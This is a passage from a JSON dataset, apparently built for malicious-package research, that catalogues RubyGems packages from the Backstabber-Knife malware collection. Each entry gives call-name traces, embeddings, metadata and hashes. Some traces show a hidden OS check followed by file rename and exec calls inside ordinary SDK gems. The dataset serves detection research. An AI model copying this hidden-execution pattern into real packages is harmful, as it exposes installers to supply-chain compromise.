'relationships.any?', 'relationships', 'data.[]=', 'serialized_relationships', 'attributes(resource).each', 'attributes', 'resource.key?', 'result.[]=', 'resource.[]', 'required_attributes.include?', 'required_attributes', 'throw', 'relationships.each', 'relationships', 'resource.key?', 'resource.[]', 'meta.[]', 'value.map', 'meta.[]', 'id.to_s', 'meta.[]', 'value.to_s', 'result.[]=', 'required_relationships.include?', 'required_relationships', 'throw', 'type.==', 'type', 'resource.keys.map(&:to_sym).-', 'resource.keys.map', 'resource.keys', 'link_attributes.[](\"properties\").keys.map', 'link_attributes.[](\"properties\").keys', 'link_attributes.[]', 'link_attributes', 'type.==', 'type', '(link_attributes.required || [])\\n.map', 'link_attributes.required', 'link_attributes', 'type.==', 'type', 'link.rel.==', 'link.rel', 'link', 'link_relationships.!', 'link_relationships', 'link_relationships.properties.reduce', 'link_relationships.properties', 'link_relationships', 'schema.properties.[](\"data\").type.first.==', 'schema.properties.[](\"data\").type.first', 'schema.properties.[](\"data\").type', 'schema.properties.[]', 'schema.properties', 'schema.properties.[](\"data\").items', 'schema.properties.[]', 'schema.properties', 'schema.properties.[](\"data\").type.first.==', 'schema.properties.[](\"data\").type.first', 'schema.properties.[](\"data\").type', 'schema.properties.[]', 'schema.properties', 'schema.properties.[]', 'schema.properties', 'schema.properties.[](\"data\").any_of.find', 'schema.properties.[](\"data\").any_of', 'schema.properties.[]', 'schema.properties', 'option.type.first.==', 'option.type.first', 'option.type', 'definition.properties.[](\"type\").pattern.source.gsub', 'definition.properties.[](\"type\").pattern.source', 'definition.properties.[](\"type\").pattern', 'definition.properties.[]', 'definition.properties', 'acc.[]=', 'relationship.to_sym', 'type.==', 'type', '(link_relationships.required || [])\\n.map', 'link_relationships.required', 'link_relationships', 'link.schema.properties.[](\"data\").properties.[]', 'link.schema.properties.[](\"data\").properties', 'link.schema.properties.[]', 'link.schema.properties', 'link.schema', 'link', 'link.schema.properties.[](\"data\").properties.[]', 'link.schema.properties.[](\"data\").properties', 'link.schema.properties.[]', 'link.schema.properties', 'link.schema', 'link', 'require', 'attr_reader', 'payloads.each', 'EntitiesRepo.payload_entities(payload).each', 'EntitiesRepo.payload_entities', 'JsonApiEntity.new', '@entities.[]', 'object.type', '@entities.[](object.type).[]=', '@entities.[]', 'object.type', 'object.id', 'entities.fetch(type, {}).values', 'entities.fetch', 'entities', 'entities.fetch(type, {}).fetch', 'entities.fetch', 'entities', 'payload.[]', 'payload.[](:data).is_a?', 'payload.[]', 'acc.+', 'payload.[]', 'acc.+', 'payload.[]', 'payload.[]', 'payload.[]', 'attr_reader', 'new', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'alpha./', 'alpha.==', 'alpha', 'red', 'green', 'blue', 'red', 'green', 'blue', 'alpha', 'red.to_s', 'red', 'green.to_s', 'green', 'blue.to_s', 'blue', '(alpha * 255).to_i.to_s', '(alpha * 255)\\n.to_i', 'alpha.*', 'alpha', 'r.length.==', 'r.length', 'g.length.==', 'g.length', 'b.length.==', 'b.length', 'a.length.==', 'a.length', '\"#\" + r + g.+', '\"#\" + r.+', '\"#\".+', 'a.!=', 'red', 'green', 'blue', 'rgb', 'hex', '::Date.parse', '::Time.parse(value).utc', '::Time.parse', 'require', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'upload_attributes.!', 'upload_attributes.[](:path).!', 'upload_attributes.[]', 'repo.entities_repo.find_entity', 'repo.entities_repo', 'upload_attributes.[]', 'upload.!', 'new', 'upload.path', 'upload.format', 'upload.size', 'upload.alt', 'upload.title', 'repo.site.entity.image_host', 'repo.site.entity', 'repo.site', 'Imgix::Client.new({ host: image_host, secure: true, include_library_param: false }).path', 'Imgix::Client.new', 'image_host', 'path', 'file.to_url', 'file', 'format', 'size', 'alt', 'title', 'url', 'require', 'value.map', 'FieldType::File.parse', 'new', 'map', 'item.to_hash', 'require', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'new', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'Seo.parse', 'site_name', 'title_suffix', 'twitter_account', 'facebook_page_url', 'fallback_seo', 'fallback_seo.to_hash', 'fallback_seo', 'require', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'upload_attributes.!', 'upload_attributes.[](:path).!', 'upload_attributes.[]', 'repo.entities_repo.find_entity', 'repo.entities_repo', 'upload_attributes.[]', 'upload.!', 'new', 'upload.path', 'upload.format', 'upload.size', 'upload.width', 'upload.height', 'upload.alt', 'upload.title', 'repo.site.entity.image_host', 'repo.site.entity', 'repo.site', 'Imgix::Client.new({ host: image_host, secure: true, include_library_param: false }).path', 'Imgix::Client.new', 'image_host', 'path', 'file.to_url', 'file', 'format', 'size', 'width', 'height', 'alt', 'title', 'url', 'JSON.parse', 'attr_reader', 'new', 'value.[]', 'value.[]', 'latitude', 'longitude', 'latitude', 'longitude', 'repo.find', 'ids.map', 'repo.find', 'new', 'map', 'item.to_hash', 'ids.map', 'repo.find', 'new', 'map', 'item.to_hash', 'attr_reader', 'new', 'value.[]', 'value.[]', 'value.[]', 'File.parse', 'title', 'description', 'image', 'image.to_hash', 'image', 'attr_reader', 'new', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'File.parse', 'primary_color', 'dark_color', 'light_color', 'accent_color', 'logo', 'logo.to_hash', 'logo', 'require', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'new', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'value.[]', 'self.width', 'self.height', 'provider.==', 'provider', 'provider_uid', 'provider.==', 'provider', 'provider_uid', 'provider.==', 'provider', 'url', 'url', 'thumbnail_url', 'title', 'width', 'height', 'provider', 'provider_url', 'provider_uid', 'require', 'require', 'require', 'require', 'Dir.[](File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/agave_client/0.1.3/agave_client-0.1.3_extracted/agave_client-0.1.3_sourcecode.rb\") + \"/field_type/*.rb\").each', 'Dir.[]', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/agave_client/0.1.3/agave_client-0.1.3_extracted/agave_client-0.1.3_sourcecode.rb\").+', 'File.dirname', 'require', 'extend', 'attr_reader', 'def_delegators', 'other.is_a?', 'other.id.==', 'other.id', 'id', 'Utils::SeoTagsBuilder.new(self, @items_repo.site).meta_tags', 'Utils::SeoTagsBuilder.new', '@items_repo.site', 'item_type.singleton', 'item_type', 'entity.item_type', 'entity', 'item_type.fields.sort_by', 'item_type.fields', 'item_type', 'fields.each_with_object', 'fields', 'ActiveSupport::HashWithIndifferentAccess.new', 'acc.[]=', 'field.api_key.to_sym', 'field.api_key', 'send', 'field.api_key', 'entity.position', 'entity', 'item_type.tree', 'item_type', 'entity.parent_id', 'entity', '@items_repo.find', 'entity.parent_id', 'entity', 'item_type.tree', 'item_type', '@items_repo.children_of(id).sort_by', '@items_repo.children_of', 'id', 'Time.parse(entity.updated_at).utc', 'Time.parse', 'entity.updated_at', 'entity', 'item_type.api_key', 'item_type', 'id', 'attributes', 'current_depth.>=', 'id', 'id', 'item_type.api_key', 'item_type', 'updated_at', 'created_at', 'item_type.sortable', 'item_type', 'base.[]=', 'position', 'item_type.tree', 'item_type', 'base.[]=', 'position', 'base.[]=', 'children.map', 'children', 'child.to_hash', 'current_depth.+', 'fields.each_with_object', 'fields', 'send', 'field.api_key', 'result.[]=', 'field.api_key.to_sym', 'field.api_key', 'value.respond_to?', 'value.method', 'm.arity.==', 'm.arity', 'value.to_hash', 'current_depth.+', 'value.to_hash', 'private', 'field.field_type', 'field_type.camelize', 'type_klass_name.safe_constantize', 'field.localized', 'entity.send', 'entity', 'Utils::LocaleValue.find', 'entity.send', 'entity', 'type_klass.parse', 'item_type.api_key', 'item_type', 'puts', 'warning.join', 'fields.find', 'fields', 'f.api_key.to_sym.==', 'f.api_key.to_sym', 'f.api_key', 'arguments.empty?', 'read_attribute', 'e.name.===', 'e.name', 'message.<<', 'message.<<', 'item_type.api_key', 'item_type', 'fields.map', 'fields', 'f.api_key', 'raise', 'message.join', 'raise', 'fields.find', 'fields', 'f.api_key.to_sym.==', 'f.api_key.to_sym', 'f.api_key', 'require', 'require', 'require', 'attr_reader', 'build_cache!', '@items_by_id.[]', 'id.to_s', '@items_by_parent_id.fetch', 'id.to_s', 'collections_by_type.key?', 'collections_by_type', 'Site.new', 'entities_repo.find_entities_of_type(\"site\").first', 'entities_repo.find_entities_of_type', 'entities_repo', 'site.locales.map', 'site.locales', 'site', 'entities_repo.find_entities_of_type', 'entities_repo', 'item_types.select', 'item_types', 'item_types.select', 'item_types', 'item_type.singleton.!', 'item_type.singleton', 'item_type_methods.[]', 'item_type_methods', 'item_type.singleton', 'Array', '@collections_by_type.[]', '@collections_by_type.[]', 'private', 'build_item_type_methods!', 'build_collections_by_type!', 'build_singletons_by_type!', 'single_instance_item_types.map', 'single_instance_item_types', 'collection_item_types.map(&:api_key).map', 'collection_item_types.map', 'collection_item_types', 'singleton_keys.&', 'item_types.each', 'item_types', 'item_type.api_key.pluralize', 'item_type.api_key', 'item_type.singleton', 'item_type.api_key', 'clashing_keys.include?', 'item_type.singleton', '@item_type_methods.[]=', 'method.to_sym', 'item_types.each', 'item_types', 'item_type_methods.[]', 'item_type_methods', '@collections_by_type.[]=', 'item_type.singleton', 'ItemCollection.new', 'item_entities.each', 'item_entities', 'Item.new', 'item_type_methods.[]', 'item_type_methods', 'item_entity.item_type', 'item_entity.item_type.singleton', 'item_entity.item_type', '@collections_by_type.[](method).push', '@collections_by_type.[]', '@items_by_id.[]=', 'item.id', 'item_entity.respond_to?', 'item_entity.parent_id', '@items_by_parent_id.[]', 'item_entity.parent_id', '@items_by_parent_id.[](item_entity.parent_id).<<', '@items_by_parent_id.[]', 'item_entity.parent_id', 'item_types.each', 'item_types', 'item_type_methods.[]', 'item_type_methods', 'item_type.singleton.!', 'item_type.singleton', 'item_type.sortable', '@collections_by_type.[](method).sort_by!', '@collections_by_type.[]', 'item_type.ordering_field', '@collections_by_type.[](method).sort_by!', '@collections_by_type.[]', 'item.send', 'item_type.ordering_field.api_key', 'item_type.ordering_field', 'item_type.ordering_direction.==', 'item_type.ordering_direction', '@collections_by_type.[](method).reverse!', '@collections_by_type.[]', 'item_types.each', 'item_types', 'item_type_methods.[]', 'item_type_methods', 'item_type.singleton', 'item_type.singleton_item', '@items_by_id.[]', 'item_type.singleton_item.id', 'item_type.singleton_item', '@collections_by_type.[]=', 'entities_repo.find_entities_of_type', 'entities_repo', 'collections_by_type.key?', 'collections_by_type', 'arguments.empty?', 'collections_by_type.[]', 'collections_by_type', 'message.<<', 'message.<<', 'collections_by_type.map', 'collections_by_type', 'raise', 'message.join', 'block.arity.==', 'block.arity', 'each_with_object({}) { |item, acc|\\n  acc.[]=(item.id, item)\\n}.each', 'each_with_object', 'acc.[]=', 'item.id', 'id.is_a?', 'find', 'item.id.==', 'item.id', 'map', 'to_a', 'attr_reader', '@payload.[]', '@payload.[]', 'other.is_a?', 'id.==', 'id', 'other.id', 'type.==', 'type', 'other.type', 'id', 'type', 'payload', 'attributes.[]', 'attributes', 'attributes.key?', 'attributes', 'relationships.key?', 'relationships', 'private', '@payload.fetch', '@payload.fetch', 'linkage.is_a?', 'linkage.map', 'data_source.find_entity', 'data_source', 'item.[]', 'item.[]', 'linkage.is_a?', 'data_source.find_entity', 'data_source', 'linkage.[]', 'linkage.[]', 'arguments.empty?', 'attributes.key?', 'attributes', 'attributes.[]', 'attributes', 'relationships.key?', 'relationships', 'dereference_linkage', 'relationships.[](method).[]', 'relationships.[]', 'relationships', 'require', 'require', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'EntitiesRepo.new', 'ItemsRepo.new', 'Thread.new', 'Thread.current.[]=', 'Thread.current', 'site', 'Thread.new', 'Thread.current.[]=', 'Thread.current', 'all_items', 'Thread.new', 'Thread.current.[]=', 'Thread.current', 'all_uploads', 'threads.map', 't.join', 't.[]', 'EntitiesRepo.new', 'ItemsRepo.new', 'private', 'client.request', 'client', 'client.items.all', 'client.items', 'client', 'preview_mode', 'client.uploads.all', 'client.uploads', 'client', 'require', 'require', 'require', 'require', 'extend', 'attr_reader', 'def_delegators', 'read_attribute', 'locales.size.>', 'locales.size', 'locales', 'read_attribute', 'read_attribute', 'id', 'name', 'Utils::FaviconTagsBuilder.new(self, theme_color).meta_tags', 'Utils::FaviconTagsBuilder.new', 'attributes.each_with_object', 'send', 'result.[]=', 'value.respond_to?', 'value.to_hash', 'private', 'entity.send', 'entity', 'Utils::LocaleValue.find', 'entity.send', 'entity', 'type_klass.parse', '@client.request', '@filters.dup.merge', '@filters.dup', '(base_response.[](:meta).[](:total_count) / items_per_page.to_f).ceil.-', '(base_response.[](:meta).[](:total_count) / items_per_page.to_f)\\n.ceil', 'base_response.[](:meta).[](:total_count)./', 'base_response.[](:meta).[]', 'base_response.[]', 'items_per_page.to_f', 'extra_pages.times', 'base_response.[]', '@client.request(:get, @base_endpoint, @filters.dup.merge({ \"page[offset]\" => items_per_page * (page + 1), \"page[limit]\" => items_per_page })).[]', '@client.request', '@filters.dup.merge', '@filters.dup', 'items_per_page.*', 'page.+', 'require', 'require', 'require', 'attr_reader', 'schema.links.each', 'schema.links', 'METHOD_NAMES.fetch', 'link.rel', 'link.rel', 'self.define_singleton_method', '[link.href.scan(IDENTITY_REGEXP).size, if link.schema && link.method != :get\\n  1\\nelse\\n  0\\nend].reduce', 'link.href.scan(IDENTITY_REGEXP).size', 'link.href.scan', 'link.href', 'link.schema', 'link.method.!=', 'link.method', 'args.size.>=', 'args.size', 'raise', 'ArgumentError.new', 'args.size', 'link.[](\"href\").gsub', 'link.[]', 'args.shift.to_s', 'args.shift', 'placeholders.<<', '[:post, :put].include?', 'link.method', 'link.schema', 'args.shift', 'JsonApiSerializer.new(type, link).serialize', 'JsonApiSerializer.new', 'link.method.==', 'link.method', 'placeholders.last', 'client.request', 'link.method', 'link.method.==', 'link.method', 'client.request', 'link.method.==', 'link.method', 'args.shift', '(args.[](0) || {}).symbolize_keys.fetch', '(args.[](0) || {})\\n.symbolize_keys', 'args.[]', 'link.schema', 'link.schema.properties.has_key?', 'link.schema.properties', 'link.schema', 'Paginator.new(client, url, query_string).response', 'Paginator.new', 'client.request', 'args.any?', 'args.shift.symbolize_keys', 'args.shift', 'options.fetch', 'JsonApiDeserializer.new.deserialize', 'JsonApiDeserializer.new', 'require', 'require', 'require', 'include', 'json_schema', 'Upload::File.new', 'file.upload', 'Upload::Image.new', 'file.upload', 'require', 'require', 'require', 'require', 'require', 'attr_reader', 'http_source?', 'Addressable::URI.parse', 'source', '::File.extname', 'uri.path', 'Tempfile.new([\"file\", ext]).tap', 'Tempfile.new', 'Downloadr::HTTP.new(source, file).download', 'Downloadr::HTTP.new', 'source', '::File.new', '::File.expand_path', 'source', 'Addressable::URI.parse', 'source', 'uri.scheme.==', 'uri.scheme', 'uri.scheme.==', 'uri.scheme', 'http_source?', '::File.basename', 'source', '::File.basename', 'file.path', 'file', 'client.upload_request.create', 'client.upload_request', 'client', 'filename', 'URI.parse', 'upload_request.[]', 'Net::HTTP::Put.new', 'request.body=', 'file.read', 'file', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.request', 'client.uploads.create', 'client.uploads', 'client', 'format_resource', 'uploads.[]', '::File.extname(::File.basename(file.path)).delete', '::File.extname', '::File.basename', 'file.path', 'file', 'upload_request.[]', '::File.size', 'file.path', 'file', 'IMAGE_FORMATS.include?', 'FastImage.size', 'file.path', 'file', 'base_format.merge', 'FastImage.type(file.path).to_s', 'FastImage.type', 'file.path', 'file', 'require', 'attr_reader', '[57, 60, 72, 76, 114, 120, 144, 152, 180].freeze', '[16, 32, 96, 192].freeze', '[[70, 70], [150, 150], [310, 310], [310, 150]].freeze', '[build_icon_tags, build_apple_icon_tags, build_windows_tags, build_color_tags, build_app_name_tag].flatten.compact', '[build_icon_tags, build_apple_icon_tags, build_windows_tags, build_color_tags, build_app_name_tag].flatten', 'build_icon_tags', 'build_apple_icon_tags', 'build_windows_tags', 'build_color_tags', 'build_app_name_tag', 'site.favicon', 'site', 'APPLE_TOUCH_ICON_SIZES.map', 'link_tag', 'url', 'site.favicon', 'site', 'ICON_SIZES.map', 'link_tag', 'url', 'site.favicon.format', 'site.favicon', 'site', 'site.favicon', 'site', 'WINDOWS_SIZES.map', 'meta_tag', 'url', 'meta_tag', 'site.name', 'site', 'theme_color', 'meta_tag', 'theme_color', 'meta_tag', 'theme_color', 'site.favicon.url', 'site.favicon', 'site', 'attrs.merge', 'require', 'I18n.fallbacks.[](I18n.locale).find', 'I18n.fallbacks.[]', 'I18n.fallbacks', 'I18n.locale', 'obj.[]', 'obj.[]', 'I18n.locale', 'require', 'require', 'item', 'og_tag', 'item.updated_at.iso8601', 'item.updated_at', 'item', 'require', 'facebook_page_url', 'og_tag', 'facebook_page_url', 'site.global_seo', 'site', 'site.global_seo.facebook_page_url', 'site.global_seo', 'site', 'require', 'require', 'require', 'attr_reader', 'site.global_seo', 'site', 'site.global_seo.fallback_seo', 'site.global_seo', 'site', 'item', 'item.fields.detect', 'item.fields', 'item', 'f.field_type.==', 'f.field_type', 'item.send', 'item', 'seo_field.api_key', 'item.send(seo_field.api_key).send', 'item.send', 'item', 'seo_field.api_key', 'fallback_seo.send', 'tag', 'tag', 'meta_tag', 'require', 'description.present?', 'description', 'meta_tag', 'description', 'og_tag', 'description', 'card_tag', 'description', 'seo_field_with_fallback', 'require', 'image', 'og_tag', 'image.url', 'image', 'card_tag', 'image.url', 'image', 'seo_field_with_fallback', 'item_image', 'item', 'item.fields.select { |field,|\\n  field.field_type == \"image\"\\n}.map { |field,|\\n  item.send(field.api_key)\\n}.compact.find', 'item.fields.select { |field,|\\n  field.field_type == \"image\"\\n}.map { |field,|\\n  item.send(field.api_key)\\n}.compact', 'item.fields.select { |field,|\\n  field.field_type == \"image\"\\n}.map', 'item.fields.select', 'item.fields', 'item', 'field.field_type.==', 'field.field_type', 'item.send', 'item', 'field.api_key', 'image.width', 'image.height', 'image.width.>=', 'image.width', 'image.height.>=', 'image.height', 'require', 'I18n.locale', 'og_tag', 'locale.upcase', 'require', 'site_name', 'og_tag', 'site_name', 'site.global_seo', 'site', 'site.global_seo.site_name', 'site.global_seo', 'site', 'require', 'item.!', 'item', 'item.singleton?', 'item', 'og_tag', 'og_tag', 'require', 'site.no_index', 'site', 'meta_tag', 'require', 'item_title', 'content_tag', 'item_title_with_suffix', 'og_tag', 'item_title', 'card_tag', 'item_title', 'item', 'item.fields.find', 'item.fields', 'item', 'field.field_type.==', 'field.field_type', 'field.appeareance.[](:type).==', 'field.appeareance.[]', 'field.appeareance', 'seo_field_with_fallback', 'title_field', 'item.send', 'item', 'title_field.api_key', 'title_field', 'site.global_seo', 'site', 'site.global_seo.title_suffix', 'site.global_seo', 'site', '(item_title + suffix).size.<=', '(item_title + suffix)\\n.size', 'item_title.+', 'item_title', 'suffix', 'item_title.+', 'item_title', 'suffix', 'item_title', 'require', 'card_tag', 'require', 'twitter_account', 'card_tag', 'twitter_account', 'site.global_seo', 'site', 'site.global_seo.twitter_account', 'site.global_seo', 'site', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', '[MetaTags::Title, MetaTags::Description, MetaTags::Image, MetaTags::Robots, MetaTags::OgLocale, MetaTags::OgType, MetaTags::OgSiteName, MetaTags::ArticleModifiedTime, MetaTags::ArticlePublisher, MetaTags::TwitterCard, MetaTags::TwitterSite].freeze', 'attr_reader', 'META_TAGS.map { |klass,|\\n  klass.new(item, site).build\\n}.flatten.compact', 'META_TAGS.map { |klass,|\\n  klass.new(item, site).build\\n}.flatten', 'META_TAGS.map', 'klass.new(item, site).build', 'klass.new', 'item', 'site', 'require', 'attr_reader', 'PusherClient.logger.level=', 'PusherClient.logger', 'connected?', 'PusherClient::Socket.new', '@socket.subscribe', 'site_id', '@socket.bind', '@socket.connect', '@socket.connected', 'connected?', '@socket.disconnect']",
            "n_tokens": 7785,
            "embedding": "[ 0.00059645 -0.02225585 -0.01107762 ...  0.01265726 -0.02744754\n  0.02841344]",
            "cluster": "0",
            "id": 197,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/agave_client/0.1.3/agave_client-0.1.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/agave_client/0.1.3/agave_client-0.1.3_extracted",
            "name": "agave_client",
            "version": "0.1.3",
            "published_at": "2020-02-16T03:40:01.529Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, rubyzip, simplecov, vcr, webmock, rubocop, diff_dirs, coveralls, faraday, faraday_middleware, activesupport, fastimage, downloadr, addressable, thor, imgix, toml, cacert, dotenv, pusher-client, listen, json_schema",
            "SHA-256": "abe1d400a5bc0fc7236c87388facb85a35d43185b391e21f7e2e4caaeba25e8e"
        },
        {
            "name_version": "alidns_ruby-0.1.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/alidns_ruby/0.1.0/alidns_ruby-0.1.0_extracted/alidns_ruby-0.1.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'module_function', 'File.dirname', '__dir__', 'File.join', 'root', 'require', 'Alidns::Configuration.new', 'include', 'config_accessor', 'configure', 'config.app_key=', 'config.response_format=', 'config.app_secret=', 'config.host=', 'config.log_file=', 'config.log_level=', 'require', 'require', 'require', 'require', 'require', 'Logging.logger.[]', 'Logging.logger', '$logger.level=', 'Alidns.config.log_level', 'Alidns.config', '$logger.add_appenders', 'Logging.appenders.stdout', 'Logging.appenders', 'Logging.appenders.file', 'Logging.appenders', 'Alidns.config.log_file', 'Alidns.config', 'Alidns.config.app_key', 'Alidns.config', 'Alidns.config.app_secret', 'Alidns.config', 'Alidns.config.host', 'Alidns.config', 'public_params', 'params.[]=', 'params_to_str', 'params + \"&\".+', 'params.+', 'Alidns::Sign.sign', 'Alidns.config.host', 'Alidns.config', 'RestClient.get', 'response.body', '(retries += 1)\\n.<', 'public_params', 'params.[]=', 'params.[]=', 'params_to_str', 'params + \"&\".+', 'params.+', 'Alidns::Sign.sign', 'Alidns.config.host', 'Alidns.config', 'RestClient.get', 'response.body', '(retries += 1)\\n.<', 'public_params', 'params.[]=', 'params.[]=', 'params.[]=', 'params.[]=', 'params.[]=', 'params.[]=', 'params.[]=', 'params.[]=', 'params_to_str', 'params + \"&\".+', 'params.+', 'Alidns::Sign.sign', 'Alidns.config.host', 'Alidns.config', 'RestClient.get', 'response.body', '(retries += 1)\\n.<', 'params.[]=', 'Alidns.config.response_format', 'Alidns.config', 'params.[]=', 'params.[]=', 'params.[]=', 'Time.now.utc.strftime', 'Time.now.utc', 'Time.now', 'params.[]=', 'params.[]=', 'rand(10 ** 30).to_s.rjust', 'rand(10 ** 30).to_s', 'rand', '10.**', 'params.[]=', 'Alidns.config.app_key', 'Alidns.config', 'params.to_a.map { |k,|\\n  \"#{k.first}=#{k.last}\"\\n}.join', 'params.to_a.map', 'params.to_a', 'k.first', 'k.last', 'require', 'require', 'require', 'require', 'params.split(\"&\").map { |k,|\\n  k.split(\"=\")\\n}.sort_by! { |k,|\\n  k.first\\n}.map { |k,|\\n  \"#{k.first}=#{k.last}\"\\n}.join', 'params.split(\"&\").map { |k,|\\n  k.split(\"=\")\\n}.sort_by! { |k,|\\n  k.first\\n}.map', 'params.split(\"&\").map { |k,|\\n  k.split(\"=\")\\n}.sort_by!', 'params.split(\"&\").map', 'params.split', 'k.split', 'k.first', 'k.first', 'k.last', 'URI.encode(req_params).gsub(\"+\", \"%20\").gsub(\"=\", \"%3D\").gsub(\"~\", \"%7E\").gsub(\"*\", \"%2A\").gsub(\"/\", \"%2F\").gsub(\":\", \"%253A\").gsub', 'URI.encode(req_params).gsub(\"+\", \"%20\").gsub(\"=\", \"%3D\").gsub(\"~\", \"%7E\").gsub(\"*\", \"%2A\").gsub(\"/\", \"%2F\").gsub', 'URI.encode(req_params).gsub(\"+\", \"%20\").gsub(\"=\", \"%3D\").gsub(\"~\", \"%7E\").gsub(\"*\", \"%2A\").gsub', 'URI.encode(req_params).gsub(\"+\", \"%20\").gsub(\"=\", \"%3D\").gsub(\"~\", \"%7E\").gsub', 'URI.encode(req_params).gsub(\"+\", \"%20\").gsub(\"=\", \"%3D\").gsub', 'URI.encode(req_params).gsub(\"+\", \"%20\").gsub', 'URI.encode(req_params).gsub', 'URI.encode', 'Base64.encode64', 'OpenSSL::HMAC.digest']",
            "n_tokens": 991,
            "embedding": "[ 0.0182685  -0.0186777  -0.0021142  ... -0.0007053  -0.02453381\n  0.01585877]",
            "cluster": "0",
            "id": 458,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/alidns_ruby/0.1.0/alidns_ruby-0.1.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/alidns_ruby/0.1.0/alidns_ruby-0.1.0_extracted",
            "name": "alidns_ruby",
            "version": "0.1.0",
            "published_at": "2020-02-16T04:08:39.595Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, activesupport, rest-client, logging",
            "SHA-256": "d1a04f08149ff402ed2ff14ab2f35b0fac00ac01d95cab07b3f07b8ae6c835c7"
        },
        {
            "name_version": "aliyun_mq-sdk-0.1.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_mq-sdk/0.1.2/aliyun_mq-sdk-0.1.2_extracted/aliyun_mq-sdk-0.1.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'attr_accessor', 'opts.[]', 'opts.[]', 'opts.[]', '(Time.now.to_f * 1000)\\n.to_i', 'Time.now.to_f.*', 'Time.now.to_f', 'Time.now', 'opts.[]', 'default_topic', 'opts.[]', 'Auth.get_sign', 'secret_key', 'topic', 'consumer_id', 'access_key', 'consumer_id', 'topic', 'query.[]=', 'self.class.get', 'self.class', 'region_url', 'res.parsed_response', 'Utils.deep_symbolize_keys', 'JSON.parse', 'res.parsed_response', 'res.response', 'opts.[]', '(Time.now.to_f * 1000)\\n.to_i', 'Time.now.to_f.*', 'Time.now.to_f', 'Time.now', 'opts.[]', 'default_topic', 'Auth.del_sign', 'secret_key', 'topic', 'consumer_id', 'access_key', 'consumer_id', 'topic', 'self.class.delete', 'self.class', 'region_url', 'res.code.===', 'res.code', 'res.parsed_response', 'Utils.symbolize_keys', 'JSON.parse(res.parsed_response).merge', 'JSON.parse', 'res.parsed_response', 'res.response', 'p', 'p', 'include', 'attr_accessor', 'opts.[]', 'opts.[]', 'Auth.post_sign', 'secret_key', 'topic', 'producer_id', 'access_key', 'producer_id', 'opts.[]', '(Time.now.to_f * 1000)\\n.to_i', 'Time.now.to_f.*', 'Time.now.to_f', 'Time.now', 'opts.[]', 'default_topic', 'opts.[]', 'opts.[]', 'opts.[]', 'opts.[]', 'headers', 'topic', 'query.[]=', 'query.[]=', 'sharding_key.nil?.!', 'sharding_key.nil?', 'hds.merge', 'is_order.to_s', 'self.class.post', 'self.class', 'region_url', 'res.parsed_response', 'Utils.symbolize_keys', 'JSON.parse(res.parsed_response).merge', 'JSON.parse', 'res.parsed_response', 'res.response', 'require', 'require', 'require', 'require', 'h.inject', 'memo.[]=', 'k.to_sym', 'obj.is_a?', 'obj.map', 'deep_symbolize_keys', 'obj.is_a?', 'obj.inject', 'memo.[]=', 'k.to_sym', 'deep_symbolize_keys', 'build_sign', '[topic, producer_id, md5(msg), date].join', 'md5', 'build_sign', '[topic, consumer_id, date].join', 'build_sign', '[topic, consumer_id, msg_handle, date].join', 'Base64.strict_encode64(\"#{OpenSSL::HMAC.digest(\"sha1\", secret_key, sign_str)}\").strip', 'Base64.strict_encode64', 'OpenSSL::HMAC.digest', 'Digest::MD5.hexdigest']",
            "n_tokens": 696,
            "embedding": "[ 0.01934017 -0.01426606 -0.00376899 ... -0.00193816 -0.01775939\n  0.01300729]",
            "cluster": "0",
            "id": 585,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_mq-sdk/0.1.2/aliyun_mq-sdk-0.1.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_mq-sdk/0.1.2/aliyun_mq-sdk-0.1.2_extracted",
            "name": "aliyun_mq-sdk",
            "version": "0.1.2",
            "published_at": "2020-02-16T04:22:36.819Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, rspec, pry, pry-byebug, httparty, stomp, json",
            "SHA-256": "cdfd2325f5062365b5519da7603f547022ad74f6ac96213e3cf52e2ad469d786"
        },
        {
            "name_version": "aliyun_mts-0.0.0",
